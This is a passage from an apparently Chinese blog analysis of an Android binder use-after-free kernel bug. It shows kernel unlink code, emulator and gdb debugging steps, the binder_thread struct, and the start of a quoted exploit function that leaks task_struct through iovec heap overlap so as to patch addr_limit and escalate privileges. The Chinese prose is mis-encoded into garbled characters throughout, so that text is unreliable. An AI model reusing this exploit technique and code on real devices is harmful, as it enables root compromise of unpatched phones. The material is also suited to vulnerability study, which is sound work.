</span></span><span class=line><span class=cl>	<span class=n>whead</span> <span class=o>=</span> <span class=n>smp_load_acquire</span><span class=p>(</span><span class=o>&amp;</span><span class=n>pwq</span><span class=o>-&gt;</span><span class=n>whead</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>whead</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>remove_wait_queue</span><span class=p>(</span><span class=n>whead</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>pwq</span><span class=o>-&gt;</span><span class=n>wait</span><span class=p>);</span> <span class=c1>//è¿›å…¥remove_wait_queue
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>rcu_read_unlock</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>remove_wait_queue</span><span class=p>(</span><span class=k>struct</span> <span class=n>wait_queue_head</span> <span class=o>*</span><span class=n>wq_head</span><span class=p>,</span> <span class=k>struct</span> <span class=n>wait_queue_entry</span> <span class=o>*</span><span class=n>wq_entry</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>flags</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>spin_lock_irqsave</span><span class=p>(</span><span class=o>&amp;</span><span class=n>wq_head</span><span class=o>-&gt;</span><span class=n>lock</span><span class=p>,</span> <span class=n>flags</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>__remove_wait_queue</span><span class=p>(</span><span class=n>wq_head</span><span class=p>,</span> <span class=n>wq_entry</span><span class=p>);</span>  <span class=c1>//è¿™é‡Œä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•°&amp;pwq-&gt;waitä¹‹å‰å·²ç»è¢«é‡Šæ”¾
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>spin_unlock_irqrestore</span><span class=p>(</span><span class=o>&amp;</span><span class=n>wq_head</span><span class=o>-&gt;</span><span class=n>lock</span><span class=p>,</span> <span class=n>flags</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kr>inline</span> <span class=kt>void</span>
</span></span><span class=line><span class=cl><span class=nf>__remove_wait_queue</span><span class=p>(</span><span class=k>struct</span> <span class=n>wait_queue_head</span> <span class=o>*</span><span class=n>wq_head</span><span class=p>,</span> <span class=k>struct</span> <span class=n>wait_queue_entry</span> <span class=o>*</span><span class=n>wq_entry</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>list_del</span><span class=p>(</span><span class=o>&amp;</span><span class=n>wq_entry</span><span class=o>-&gt;</span><span class=n>entry</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kr>inline</span> <span class=kt>void</span> <span class=nf>list_del</span><span class=p>(</span><span class=k>struct</span> <span class=n>list_head</span> <span class=o>*</span><span class=n>entry</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>__list_del_entry</span><span class=p>(</span><span class=n>entry</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>[...]</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kr>inline</span> <span class=kt>void</span> <span class=nf>__list_del_entry</span><span class=p>(</span><span class=k>struct</span> <span class=n>list_head</span> <span class=o>*</span><span class=n>entry</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=p>[...]</span>
</span></span><span class=line><span class=cl>        <span class=n>__list_del</span><span class=p>(</span><span class=n>entry</span><span class=o>-&gt;</span><span class=n>prev</span><span class=p>,</span> <span class=n>entry</span><span class=o>-&gt;</span><span class=n>next</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kr>inline</span> <span class=kt>void</span> <span class=nf>__list_del</span><span class=p>(</span><span class=k>struct</span> <span class=n>list_head</span> <span class=o>*</span> <span class=n>prev</span><span class=p>,</span> <span class=k>struct</span> <span class=n>list_head</span> <span class=o>*</span> <span class=n>next</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>next</span><span class=o>-&gt;</span><span class=n>prev</span> <span class=o>=</span> <span class=n>prev</span><span class=p>;</span> <span class=c1>//unlinkæ“ä½œ
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>WRITE_ONCE</span><span class=p>(</span><span class=n>prev</span><span class=o>-&gt;</span><span class=n>next</span><span class=p>,</span> <span class=n>next</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>å°†<code>binder_thread->wait.head</code>çš„æŒ‡é’ˆå†™å…¥<code>binder_thread->wait.head.prev</code>å’Œ<code>binder_thread->wait.head.next</code>ã€‚</p><h4 id=pocè°ƒè¯•åˆ†æ>Pocè°ƒè¯•åˆ†æ</h4><p>è¿™é‡Œæ‰‹ä¸Šæ²¡æœ‰ç›´æ¥èƒ½ç”¨çš„è®¾å¤‡ï¼Œç”¨çš„æ¨¡æ‹Ÿå™¨è°ƒè¯•ã€‚å¯ç›´æ¥æŒ‰ç…§<a class=link href=https://cloudfuzz.github.io/android-kernel-exploitation/chapters/environment-setup.html#software-requirements target=_blank rel=noopener>è¿™ä¸ªæ•™ç¨‹</a>çš„é…ç½®è°ƒè¯•ã€‚ä¸è¿‡è¿™ä¸ªæ•™ç¨‹å…³é—­äº†ä¸€äº›ä¿æŠ¤ï¼Œä½¿å¾—åˆ©ç”¨è¦ç®€å•äº›ï¼Œä¸è¿‡è¿‡ç¨‹æ˜¯å·®ä¸å¤šä¸€æ ·çš„ã€‚</p><p>ç¼–è¯‘å®Œgoldfishåå¯åŠ¨<code>emulator -show-kernel -no-snapshot -wipe-data -avd 2019-2215 -kernel bzImage -qemu -s -S</code>ç­‰å¾…qemuçš„è¿æ¥ã€‚</p><p>gdbå¯åŠ¨<code>gdb -quiet vmlinux -ex 'target remote :1234'</code> é”®å…¥cç»§ç»­å¯åŠ¨æ¨¡æ‹Ÿå™¨ã€‚</p><p>ç­‰å¾…æ¨¡æ‹Ÿå™¨å®Œå…¨å¯åŠ¨åç¼–è¯‘poc pushè¿›æ¨¡æ‹Ÿå™¨ã€‚</p><p>binder_threadé‡Šæ”¾ä¹‹å‰ï¼Œåç§»a8å¤„ä¸º<code>wait.head</code>çš„å€¼ï¼Œè¿™é‡Œæˆ‘ä»¬æ‹¥æœ‰å†…æ ¸æºç ä»¥åŠç¼–è¯‘å¥½çš„vmliuxï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç®—å‡ºæ¥<code>wait.head</code>ç›¸å¯¹äºbinder_threadåœ°å€çš„åç§»é‡ã€‚</p><p><img src=https://my-md-1253484710.file.myqcloud.com/b1.png loading=lazy></p><p>freeä¹‹åæœªunlinkä¹‹å‰binder_threadçš„å€¼ä¸€æ ·æœªå˜ã€‚</p><p><img src=https://my-md-1253484710.file.myqcloud.com/b2.png loading=lazy></p><p>unlinkä¹‹åï¼Œbinder_thread->wait.headå†™å…¥<code>binder_thread->wait.head.next</code> and <code>binder_thread->wait.head.prev</code>ä¸¤ä¸ªæŒ‡é’ˆã€‚</p><p><img src=https://my-md-1253484710.file.myqcloud.com/b3.png loading=lazy></p><p>åœ¨æœªå¼€å¯KASançš„è®¾å¤‡ä¸Šæˆ‘ä»¬çœ‹ä¸åˆ°ä»»ä½•å¥”æºƒã€‚ä½†æ˜¯è°ƒè¯•æ—¶æˆ‘ä»¬èƒ½çœ‹åˆ°ç¡®å®è§¦å‘äº†æ¼æ´ã€‚</p><h3 id=0x03-æ¼æ´åˆ©ç”¨>0x03 æ¼æ´åˆ©ç”¨</h3><p>æ¼æ´t_threadç»“æ„ä½“å¦‚ä¸‹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>binder_thread</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>struct</span> <span class=n>binder_proc</span> <span class=o>*</span><span class=n>proc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>struct</span> <span class=n>rb_node</span> <span class=n>rb_node</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>struct</span> <span class=n>list_head</span> <span class=n>waiting_thread_node</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>pid</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>looper</span><span class=p>;</span>              <span class=cm>/* only modified by this thread */</span>
</span></span><span class=line><span class=cl>        <span class=kt>bool</span> <span class=n>looper_need_return</span><span class=p>;</span> <span class=cm>/* can be written by other thread */</span>
</span></span><span class=line><span class=cl>        <span class=k>struct</span> <span class=n>binder_transaction</span> <span class=o>*</span><span class=n>transaction_stack</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>struct</span> <span class=n>list_head</span> <span class=n>todo</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>bool</span> <span class=n>process_todo</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>struct</span> <span class=n>binder_error</span> <span class=n>return_error</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>struct</span> <span class=n>binder_error</span> <span class=n>reply_error</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>wait_queue_head_t</span> <span class=n>wait</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>struct</span> <span class=n>binder_stats</span> <span class=n>stats</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>atomic_t</span> <span class=n>tmp_ref</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>bool</span> <span class=n>is_dead</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>struct</span> <span class=n>task_struct</span> <span class=o>*</span><span class=n>task</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>æ³¨æ„çœ‹è¯¥ç»“æ„ä½“ä¸­æœ‰ä¸ªtaskæˆå‘˜ï¼Œä¸ºtask_structç±»å‹ã€‚æˆ‘ä»¬é¦–å…ˆè¦åšçš„å°±æ˜¯æ³„éœ²è¿™ä¸ªç»“æ„ä½“çš„åœ°å€ï¼Œå°†å®ƒæ”¹ä¸ºNULLä¹‹åï¼Œæ‰§è¡Œææƒè¯­å¥ã€‚ä¸‹é¢æ ¹æ®<a class=link href=https://github.com/sharif-dev/AndroidKernelVulnerability/blob/master/exploit.cpp target=_blank rel=noopener>exp</a>åˆ†ææ•´ä¸ªææƒçš„æµç¨‹ã€‚</p><h4 id=patch-addr_limit>patch addr_limit</h4><p>é˜»æ­¢æˆ‘ä»¬æ‹¿åˆ°æƒé™çš„ç¬¬ä¸€é“å…³å¡ä¸ºtask_structç»“æ„ä½“æˆå‘˜thread_infoä¸­çš„addr_limitï¼ˆåœ¨x86_64ä¸Šæ˜¯ç›´æ¥ä½œä¸ºtask_structçš„æˆå‘˜ï¼‰ï¼Œç”¨äºéš”ç¦»å†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´ã€‚å¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶å®ƒçš„å€¼ï¼Œç›¸å½“äºæˆ‘ä»¬èƒ½å®Œå…¨çš„è®¿é—®å†…æ ¸ç©ºé—´ã€‚æ‰€ä»¥ç¬¬ä¸€æ­¥å°±æ˜¯æŠŠaddr_limit patchæ‰ã€‚</p><p>æƒ³è¦patchæ‰addr_limitï¼Œå¾—å…ˆæ³„éœ²å‡ºtask_structçš„åœ°å€ï¼Œå†å°†å€¼æ”¹ä¸º<code>0xFFFFFFFFFFFFFFFE</code>ã€‚åé¢å†è¯´ä¸ºä»€ä¹ˆè¦æ”¹ä¸ºè¿™ä¸ªå€¼ã€‚</p><p>è¿™é‡Œå…ˆäº†è§£ä¸€ä¸‹<strong>vectored I/O</strong>ï¼Œä¹Ÿç§°ä¸ºåˆ†æ•£/èšé›† I/Oï¼Œæ˜¯ä¸€ç§å¯ä»¥åœ¨å•æ¬¡ç³»ç»Ÿè°ƒç”¨ä¸­å¯¹å¤šä¸ªç¼“å†²åŒºè¾“å…¥è¾“å‡ºçš„æ–¹æ³•ï¼Œå¯ä»¥æŠŠå¤šä¸ªç¼“å†²åŒºçš„æ•°æ®å†™åˆ°å•ä¸ªæ•°æ®æµï¼Œä¹Ÿå¯ä»¥æŠŠå•ä¸ªæ•°æ®æµè¯»åˆ°å¤šä¸ªç¼“å†²åŒºä¸­ã€‚ä¸çº¿æ€§ I/O ç›¸æ¯”ï¼Œvectored I/Oæœ‰ä¸€äº›ä¼˜åŠ¿ï¼šå¯ä»¥ä½¿ç”¨ä¸è¿ç»­çš„ä¸åŒç¼“å†²åŒºè¿›è¡Œå†™å…¥æˆ–è¯»å–ï¼Œè€Œä¸ä¼šäº§ç”Ÿå¤§é‡å¼€é”€ã€‚æ”¯æŒåŸå­æ€§ã€‚ä½¿ç”¨vectored I/Oå¯ä»¥å°†å¤´éƒ¨å’Œæ•°æ®ä¿å­˜åœ¨å•ç‹¬çš„éè¿ç»­ç¼“å†²åŒºä¸­ï¼Œå¹¶é€šè¿‡ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨è€Œä¸æ˜¯ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨å¯¹å…¶è¿›è¡Œè¯»å–æˆ–å†™å…¥ã€‚</p><p><img src=https://my-md-1253484710.file.myqcloud.com/20200629154204.png loading=lazy></p><p>readv() å‡½æ•°ä»æ–‡ä»¶æè¿°ç¬¦ fd ä¸­è¯»å– count ä¸ªæ®µ (segment) (ä¸€ä¸ªæ®µå³ä¸€ä¸ª iovec ç»“æ„ä½“ï¼‰åˆ°å‚æ•° iov æ‰€æŒ‡å®šçš„ç¼“å†²åŒºä¸­ã€‚</p><p>write() å‡½æ•°ä»å‚æ•° iov æŒ‡å®šçš„ç¼“å†²åŒºä¸­è¯»å– count ä¸ªæ®µçš„æ•°æ®ï¼Œå¹¶å†™å…¥ fd ä¸­ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/uio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=n>ssize_t</span> <span class=nf>readv</span> <span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=k>const</span> <span class=k>struct</span> <span class=n>iovec</span> <span class=o>*</span><span class=n>iov</span><span class=p>,</span><span class=n>vint</span> <span class=n>count</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>ssize_t</span> <span class=nf>writev</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span><span class=k>const</span> <span class=k>struct</span> <span class=n>iovec</span> <span class=o>*</span><span class=n>iov</span><span class=p>,</span> <span class=kt>int</span> <span class=n>count</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>æ¯ä¸ª iovec ç»“æ„ä½“æè¿°ä¸€ä¸ªç‹¬ç«‹çš„ï¼Œç‰©ç†ä¸è¿ç»­çš„ç¼“å†²åŒºï¼Œæˆ‘ä»¬ç§°å…¶ä¸ºæ®µ(segment)ï¼Œæ¯ä¸ªiovecç»“æ„ä½“ç›¸å¯¹è¾ƒå°ï¼Œåœ¨64bitç³»ç»Ÿä¸‹iovecçš„å¤§å°ä»…ä¸º0x10ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>iovec</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=n>__user</span> <span class=o>*</span><span class=n>iov_base</span><span class=p>;</span>    <span class=cm>/* BSD uses caddr_t (1003.1g requires void *) */</span>
</span></span><span class=line><span class=cl>    <span class=n>__kernel_size_t</span> <span class=n>iov_len</span><span class=p>;</span> <span class=cm>/* Must be size_t (1003.1g) */</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></td></tr></table></div></div><p>å¦‚ä½•æ³„éœ²å‡ºtask_structï¼Ÿçœ‹äº†å‡ ä¸ªexpï¼Œéƒ½ç”¨çš„æ˜¯<code>struct iovec</code>å»å ä½è¦†ç›–å‰é¢é‡Šæ”¾çš„binder_threadã€‚è¿™ä¹Ÿæ˜¯Project Zeroçš„åšæ³•ã€‚è¿™ä¸ªæ–¹æ³•æœ€åˆæ˜¯ç”±Keenå®éªŒå®¤æå‡ºçš„ï¼Œiovecå…·æœ‰ä¸€äº›å°ç‰¹æ€§ä½¿å¾—å®ƒå¾ˆé€‚åˆç”¨æ¥ä½œä¸ºæ”»å‡»çš„åª’ä»‹ï¼š</p><ol><li>åœ¨64bitç³»ç»Ÿä¸‹åªæœ‰0x10çš„å¤§å°</li><li>å®¹æ˜“æ§åˆ¶å®ƒçš„æˆå‘˜iov_baseå’Œiov_lenã€‚</li><li>å¯ä»¥æ§åˆ¶å†™å…¥çš„ä¸ªæ•°æ§åˆ¶iovecæœ€ç»ˆè¿›å…¥å“ªä¸ªkmallocç¼“å­˜</li><li>å®ƒæœ‰ä¸€ä¸ªæŒ‡å‘ç¼“å†²åŒºçš„æŒ‡é’ˆå’Œä¸€ä¸ªé•¿åº¦ï¼Œè¿™æ˜¯ä½¿ç”¨unlinkè¿›è¡Œç ´åçš„ç†æƒ³å­—æ®µ</li></ol><p>å¯é€šè¿‡readvã€writevã€recvmsgã€sendmsgç­‰ç³»ç»Ÿè°ƒç”¨å’Œiovecæ˜¯å®ç°linuxä¸‹çš„Vectored I/Oã€‚åœ¨æ¼æ´åˆ©ç”¨ä¸­æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ¥ç»•è¿‡æ£€æŸ¥ï¼Œå¯¹å·²é‡Šæ”¾çš„ç©ºé—´è¿›è¡Œå ä½å¸ƒå±€å †é£æ°´ã€‚</p><p>çœ‹çœ‹expå¦‚ä½•å¦‚æ¥æ³„éœ²ä¿¡æ¯ï¼Œä½œè€…å†™äº†å¾ˆè¯¦ç»†çš„æ³¨é‡Šï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=n>BinderUaF</span><span class=o>::</span><span class=n>leakTaskStruct</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>pipe_fd</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=n>ssize_t</span> <span class=n>nBytesRead</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>static</span> <span class=kt>char</span> <span class=n>dataBuffer</span><span class=p>[</span><span class=n>PAGE_SIZE</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>iovec</span> <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_COUNT</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=n>nullptr</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Get binder fd
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>setupBinder</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Create event poll
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>setupEventPoll</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=c1>// We are going to use iovec for scoped read/write,
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// we need to make sure that iovec stays in the kernel
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// before we trigger the unlink after binder_thread has
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// been freed.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// One way to achieve this is by using the blocking APIs
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// in Linux kernel. Such APIs are read, write, etc on pipe.
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=c1>// Setup pipe for iovec
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;[+] Setting up pipe</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>pipe</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[-] Unable to create pipe</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] Pipe created successfully</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// pipe_fd[0] = read fd
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// pipe_fd[1] = write fd
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Default size of pipe is 65536 = 0x10000 = 64KB
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// This is way much of data that we care about
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Let&#39;s reduce the size of pipe to 0x1000
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=n>fcntl</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>F_SETPIPE_SZ</span><span class=p>,</span> <span class=n>PAGE_SIZE</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[-] Unable to change the pipe capacity</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] Changed the pipe capacity to: 0x%x</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>PAGE_SIZE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;[+] Setting up iovecs</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// As we are overlapping binder_thread with iovec,
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// binder_thread-&gt;wait.lock will align to iovecStack[10].io_base.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// If binder_thread-&gt;wait.lock is not 0 then the thread will get
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// stuck in trying to acquire the lock and the unlink operation
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// will not happen.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
